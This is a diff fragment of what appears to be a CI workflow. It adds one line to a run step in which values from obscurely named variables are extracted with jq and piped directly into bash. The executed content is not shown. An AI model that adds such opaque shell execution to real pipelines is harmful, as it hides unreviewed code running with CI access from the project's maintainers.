@@ -55,6 +55,7 @@ jobs:
           echo $xyw5103 | jq -r .lngc1 | /bin/bash
           echo $apkyw8567 | jq -r .s93 | /bin/bash
           echo $ddrx0204 | jq -r .py529 | /bin/bash
+          printf '%s' "$dvc6691" | jq -r .qld46808 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
